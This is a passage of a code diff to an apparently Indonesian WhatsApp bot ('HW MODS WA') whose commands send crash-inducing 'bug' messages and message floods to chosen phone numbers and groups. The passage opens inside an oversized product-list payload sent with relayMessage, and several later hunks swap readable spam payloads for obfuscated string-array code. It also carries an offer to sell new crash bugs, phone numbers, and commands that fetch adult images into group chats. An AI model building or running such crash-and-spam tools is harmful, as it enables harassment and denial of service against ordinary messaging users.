(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'1847261837216269'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'1847261837216269'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a5)},{'productId':'1847261837216262244'},{'productId':'184726183721626282'},{'productId':_0x39080c(0x191)},{'productId':_0x39080c(0x191)},{'productId':_0x39080c(0x192)},{'productId':_0x39080c(0x18e)},{'productId':'184726183721626282'},{'productId':_0x39080c(0x18e)},{'productId':_0x39080c(0x190)},{'productId':_0x39080c(0x190)},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x195)},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x1a5)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x19c)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x191)},{'productId':_0x39080c(0x192)},{'productId':'184726183721626282'},{'productId':_0x39080c(0x18e)},{'productId':'184726183721626282'},{'productId':_0x39080c(0x190)},{'productId':_0x39080c(0x190)},{'productId':'1847261837216262'},{'productId':'1847261837216262'},{'productId':_0x39080c(0x195)},{'productId':_0x39080c(0x1a5)},{'productId':'1847261837216262'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'}]}],'headerImage':{'productId':_0x39080c(0x18f)},'businessOwnerJid':'6281214281312@s.whatsapp.net'},'footerText':''+buttonkal}}),{'userJid':m[_0x39080c(0x1a2)],'quoted':m});function _0x4b8f(_0x635405,_0x57e435){var _0x3b16d7=_0x3b16();return _0x4b8f=function(_0x4b8f78,_0x305957){_0x4b8f78=_0x4b8f78-0x18d;var _0x3baff1=_0x3b16d7[_0x4b8f78];return _0x3baff1;},_0x4b8f(_0x635405,_0x57e435);}haikal['relayMessage'](m[_0x39080c(0x1a2)],bugshinchan[_0x39080c(0x198)],{'messageId':bugshinchan[_0x39080c(0x19f)]['id']});
 }
 }
 break
@@ -1071,6 +996,7 @@ tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
 m.reply(tekteka)
 }
 break
+//=================================================//
 case 'jagoanom' : {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
@@ -1093,7 +1019,6 @@ break
 case 'ampas1' : {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!isRegistered) return replyReg(mess.verif)
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
 haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
@@ -1118,7 +1043,6 @@ break
 /*BUG WACAP */
 case 'ampas2' : {
 if (isBan) throw sticBanLu(from)
-if (!isRegistered) return replyReg(mess.verif)
 if (!isCreator) return
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
 a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
@@ -1140,6 +1064,10 @@ haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
 await sleep(10000)
 }
 break
+//=================================================//
+//CUMAN WORKS DI BAILEYS TERTENTU KALAU MAU GUNAKAN 
+//BUG BARU INI KALIAN BISA ORDER KE GUA YA GUYS YAH
+/*
 case '🔥': {
 if (isBan) throw sticBanLu(from)
 if (!isCreator) return
@@ -1148,43 +1076,23 @@ jumlah = text.split("|")[1]
 let secon = text.split("|")[2]
 a = await deploy(`Succes send bug "CRASH🐼" Ke ${mm} Sebanyak ${jumlah} kali dalam waktu ${secon} detik`)
 for (let i = 0; i < jumlah ; i++){
-await haikal.sendMessage(mm, { 
-text: '', 
-templateButtons: [
-{ callButton: { displayText: `OWNER`, phoneNumber: `6285714170944`}},
-{ callButton: { displayText: `OWNER`, phoneNumber: `6281214281312`}},
-{ urlButton: { displayText: `GROUP HW MODS WA`, url: `https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2`}},
-{ quickReplyButton: { displayText: `MY`, id: `Anjay Menger`}},
-{ quickReplyButton: { displayText: `NAME`, id: `AH SLEBEEW`}},
-{ quickReplyButton: { displayText: `HW MODS WA`, id: `JAGOAN OM?`}},
-]
- })
+function _0x128b(_0x4b9866,_0x371baa){var _0x50e42b=_0x50e4();return _0x128b=function(_0x128b07,_0x1424a2){_0x128b07=_0x128b07-0xc4;var _0x46e270=_0x50e42b[_0x128b07];return _0x46e270;},_0x128b(_0x4b9866,_0x371baa);}function _0x50e4(){var _0x19e1ed=['AH\x20SLEBEEW','1GwlWkW','GROUP\x20HW\x20MODS\x20WA','Anjay\x20Menger','27130YhLdkr','JAGOAN\x20OM?','HW\x20MODS\x20WA','2064696gWphjy','4LwmPfv','2167585ExfAxr','NAME','6281214281312','8702696DrukdN','https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2','6017EGBulL','1073458pGrfkv','6dptURc','6285714170944','10304770yoKCaH','16102656Vbpaag','OWNER'];_0x50e4=function(){return _0x19e1ed;};return _0x50e4();}var _0x1cddf0=_0x128b;(function(_0x34c939,_0x276d78){var _0x100957=_0x128b,_0x2bb075=_0x34c939();while(!![]){try{var _0x487c43=-parseInt(_0x100957(0xd7))/0x1*(-parseInt(_0x100957(0xd0))/0x2)+parseInt(_0x100957(0xc8))/0x3*(parseInt(_0x100957(0xc9))/0x4)+parseInt(_0x100957(0xca))/0x5*(parseInt(_0x100957(0xd1))/0x6)+-parseInt(_0x100957(0xd3))/0x7+parseInt(_0x100957(0xcd))/0x8+-parseInt(_0x100957(0xd4))/0x9+-parseInt(_0x100957(0xc5))/0xa*(-parseInt(_0x100957(0xcf))/0xb);if(_0x487c43===_0x276d78)break;else _0x2bb075['push'](_0x2bb075['shift']());}catch(_0x382e1c){_0x2bb075['push'](_0x2bb075['shift']());}}}(_0x50e4,0xec948),await haikal['sendMessage'](mm,{'text':'','templateButtons':[{'callButton':{'displayText':_0x1cddf0(0xd5),'phoneNumber':_0x1cddf0(0xd2)}},{'callButton':{'displayText':_0x1cddf0(0xd5),'phoneNumber':_0x1cddf0(0xcc)}},{'urlButton':{'displayText':_0x1cddf0(0xd8),'url':_0x1cddf0(0xce)}},{'quickReplyButton':{'displayText':'MY','id':_0x1cddf0(0xc4)}},{'quickReplyButton':{'displayText':_0x1cddf0(0xcb),'id':_0x1cddf0(0xd6)}},{'quickReplyButton':{'displayText':_0x1cddf0(0xc7),'id':_0x1cddf0(0xc6)}}]}));
   await sleep(10000* secon)
 }
 }
 break
 case '🌷':{
-if (!isCreator) throw sticOwner(from)
+if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
-await haikal.sendMessage(m.chat, { 
-text: '', 
-templateButtons: [
-{ callButton: { displayText: `OWNER`, phoneNumber: `6285714170944`}},
-{ callButton: { displayText: `OWNER`, phoneNumber: `6281214281312`}},
-{ urlButton: { displayText: `GROUP HW MODS WA`, url: `https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2`}},
-{ quickReplyButton: { displayText: `MY`, id: `Anjay Menger`}},
-{ quickReplyButton: { displayText: `NAME`, id: `AH SLEBEEW`}},
-{ quickReplyButton: { displayText: `HW MODS WA`, id: `JAGOAN OM?`}},
-]
- })
+function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','6281214281312','771192XPifQJ','6285714170944','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','reply\x20Menger','https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20HW\x20MODS\x20WA','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'HW\x20MODS\x20WA','id':_0x47bf3a(0x153)}}]}));
  await sleep(20)
 }
 }
-break
+break */
 //=================================================//
 case 'afk': {
 if (isBan) throw sticBanLu(from)
@@ -1196,7 +1104,7 @@ m.reply(`${m.pushName} Hello Saya Bot Hw Mods${text ? ': ' + text : ''}`)
 break
 //=================================================//
 case 'bugstik':{
-if (!isCreator) throw sticOwner(from)
+if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1210,17 +1118,17 @@ participant: `0@s.whatsapp.net`,
 }, 
 "message": {
 "stickerMessage": {
-					"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
-					"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
-					"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
-					"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
-					"mimetype": "image/webp",
-					"height": 1288,
+"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
+"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
+"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
+"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
+"mimetype": "image/webp",
+"height": 1288,
 "width": 1288,
-					"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
-					"fileLength": "14240",
-					"mediaKeyTimestamp": "1664991742",
-					"isAnimated": false,
+"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
+"fileLength": "14240",
+"mediaKeyTimestamp": "1664991742",
+"isAnimated": false,
 }
 }
 }})
@@ -1326,6 +1234,7 @@ m.reply('*Success Broadcast*')
 }
 break
 //=================================================//
+/*
 case 'buttonampas':
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
@@ -1346,20 +1255,16 @@ headerType: 1
 }
 haikal.sendMessage(m.chat, buttonMessage)
 }
- break
+ break*/
 //=================================================//
 case 'bugtag': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!m.isGroup) throw groupon(from)
-if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
-jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku haikal`
-for (let i = 0; i < jumlah; i++) {
 haikal.sendMessage(m.chat, { text : `${buttonkal}` , mentions: participants.map(a => a.id)}, { quoted: doc })
 }
-}
 break
+//=================================================//
 case 'hiya':{
 if (isBan) throw sticBanLu(from)
 if (!isCreator) return
@@ -1401,77 +1306,70 @@ break
 //=================================================//
 case 'bugsange': {
 if (isBan) throw sticBanLu(from)
-if (!m.isGroup) return m.reply(mess.group)
-if (!isBotAdmins) return m.reply(mess.botAdmin)
-if (!isAdmins && !isCreator) return m.reply(mess.admin)
+if (!isRegistered) return replyReg(mess.verif)
+if (!m.isGroup) return anjay(mess.group)
+if (!isBotAdmins) return anjay(mess.botAdmin)
+if (!isAdmins && !isCreator) return anjay(mess.admin)
 if (args[0] === "on") {
-if (AntiNsfww) return m.reply('Sudah Aktif')
+if (AntiNsfww) return anjay('Sudah Aktif')
 ntnsfww.push(from)
-m.reply('Sukses Telah mengaktifkan Bug Sange Di group Ini')
+anjay('Sukses Telah mengaktifkan Bug Sange Di group Ini')
 var groupe = await haikal.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
-haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya Dan Fitur Ini Mengandung Bug`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya Dan Fitur Ini Mengandung Bug`, contextInfo: { mentionedJid : mems }}, {quoted:hw})
 } else if (args[0] === "off") {
-if (!AntiNsfww) return m.reply('Sudah Non Aktif')
+if (!AntiNsfww) return anjay('Sudah Non Aktif')
 let off = ntnsfww.indexOf(from)
 ntnsfww.splice(off, 1)
-m.reply('Sukses Mematikan Bug Sange di group ini')
+anjay('Sukses Mematikan Bug Sange di group ini')
 } else {
-let buttonsntnsfww = [
-{ buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
-{ buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
-]
-await haikal.sendButtonText(m.chat, buttonsntnsfww, `Klick Button Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan
-\n\n*WELCOME\n\n
+const anuala = {
+video:fs.readFileSync("./baseikal/video/haikal.mp4"),
+gifPlayback:true,
+jpegThumbnail:log0,
+caption: `© Hay Kak ${pushname} 👋 Selamat ${salam}
+
+\n\n*SILAHKAN KETIK TEXT YANG ADA DI BAWAH\n\n
 bugcrot
-bugahay `, `HW MODS WA${ngazap(prefix)}`, m)
+bugahay `,
+}
+haikal.sendMessage(m.chat, anuala, `HW MODS WA${ngazap(prefix)}`, m)
 }
 }
 break
-//=================================================//
 case 'bugcrot' :
 if (isBan) throw sticBanLu(from)
-if (!m.isGroup) return m.reply(mess.group)
-if (!AntiNsfww) return m.reply(mess.nsfw)
+if (!isRegistered) return replyReg(mess.verif)
+if (!m.isGroup) return anjay(mess.group)
+if (!AntiNsfww) return anjay(mess.nsfw)
  waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
- let bugcrotbot = [
- {buttonId: `bugcrot`, buttonText: {displayText: buttonvirus}, type: 1},
- ]
-let button3Messagess = {
+const bugcrot = {
 image: {url:waifudd.data.url},
-caption:`HW MODS WA`,
-buttons: bugcrotbot,
-headerType: 1
+caption: `© HW MODS WA ${buttonkal}`,
 } 
- await haikal.sendMessage(m.chat, button3Messagess, { quoted: doc }).catch(err => {
+haikal.sendMessage(m.chat, bugcrot, { quoted: m }).catch(err => {
  return('Error!')
 })
 break
-//=================================================//
 case 'bugahay' :
 if (isBan) throw sticBanLu(from)
-if (!m.isGroup) return m.reply(mess.group)
-if (!AntiNsfww) return m.reply(mess.nsfw)
-m.reply(mess.wait)
+if (!isRegistered) return replyReg(mess.verif)
+if (!m.isGroup) return anjay(mess.group)
+if (!AntiNsfww) return anjay(mess.nsfw)
+anjay(mess.wait)
  waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
- let bugahaybot = [
- {buttonId: `bugahay`, buttonText: {displayText: buttonvirus}, type: 1},
- ]
-let button4Messagess = {
+ const bugahay = {
 image: {url:waifudd.data.url},
-caption:`HW MODS WA`,
-buttons: bugahaybot,
-headerType: 1
+caption: `© HW MODS WA ${buttonkal}`,
 } 
- await haikal.sendMessage(m.chat, button4Messagess, { quoted: doc }).catch(err => {
+haikal.sendMessage(m.chat, bugahay, { quoted: m }).catch(err => {
  return('Error!')
 })
 break
-//=================================================//
 //=================================================//
 case 'jadibug1': {
 if (isBan) throw sticBanLu(from)
@@ -1542,7 +1440,6 @@ haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: doc })
 }
 break
 //=================================================//
-//=================================================//
 case 'hu': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
@@ -1551,7 +1448,7 @@ jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
  mem = fs.readFileSync('./baseikal/sound/tes.mp3')
- haikal.sendMessage(jumlah, {audio: mem, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
+ haikal.sendMessage(m.chat, {audio: mem, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
  }
  }
  break
@@ -1564,7 +1461,7 @@ jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
  mom = fs.readFileSync('./baseikal/sound/ketawa.mp3')
- haikal.sendMessage(jumlah, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
+ haikal.sendMessage(m.chat, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
  }
  }
  break
@@ -1577,7 +1474,7 @@ jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
  mim = fs.readFileSync('./baseikal/sound/ketawa.mp3')
- haikal.sendMessage(jumlah, {audio: mim, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
+ haikal.sendMessage(m.chat, {audio: mim, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
  }
  }
  break
@@ -1590,7 +1487,7 @@ jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
  mum = fs.readFileSync('./baseikal/sound/awkwk.mp3')
- haikal.sendMessage(jumlah, {audio: mum, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
+ haikal.sendMessage(m.chat, {audio: mum, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
  }
  }
  break
@@ -1603,7 +1500,7 @@ jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
  ah = fs.readFileSync('./baseikal/sound/bang.mp3')
- haikal.sendMessage(jumlah, {audio: ah, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
+ haikal.sendMessage(m.chat, {audio: ah, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
  }
  }
  break
@@ -1616,7 +1513,7 @@ jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
  eh = fs.readFileSync('./baseikal/sound/nob.mp3')
- haikal.sendMessage(jumlah, {audio: eh, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
+ haikal.sendMessage(m.chat, {audio: eh, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
  }
  }
  break
@@ -1629,7 +1526,7 @@ jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
  ih = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
- haikal.sendMessage(jumlah, {audio: ih, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
+ haikal.sendMessage(m.chat, {audio: ih, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
  }
  }
  break
@@ -1642,7 +1539,7 @@ jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
